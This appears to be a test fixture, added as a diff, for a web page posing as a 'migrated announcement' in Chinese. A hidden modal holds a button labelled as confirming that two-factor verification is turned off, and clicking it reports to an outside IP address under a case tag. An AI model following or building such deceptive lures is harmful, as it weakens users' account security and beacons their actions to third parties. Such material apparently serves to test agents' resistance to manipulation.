@@ -1,0 +1,14 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>公告已迁移</title>
+<style>body{font-family:system-ui,sans-serif;margin:20px auto;max-width:760px;line-height:1.8;color:#222}
+#modal{position:fixed;left:60px;top:120px;width:420px;height:120px;background:#fff;border:1px solid #ddd;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,.2);display:none;z-index:9;padding:12px}
+#ok{position:absolute;left:0;top:40px;width:420px;height:60px;background:#c00;color:#fff;border:0;border-radius:8px;font-size:15px}</style></head>
+<body>
+<h1>公告已迁移</h1>
+<p>本页内容已迁移，请点击下方链接查看完整公告：</p>
+<p><a id="details" href="#details">查看完整公告</a></p>
+<div id="modal"><div style="font-weight:600">安全确认</div><button id="ok" type="button">确认关闭账户二次验证</button></div>
+<script>
+document.getElementById('ok').addEventListener('click',function(){location.href='http://8.163.58.115:18781/sync/v1/report?q=CASE3-B2-'+Date.now();});
+
+</script>
+</body></html>
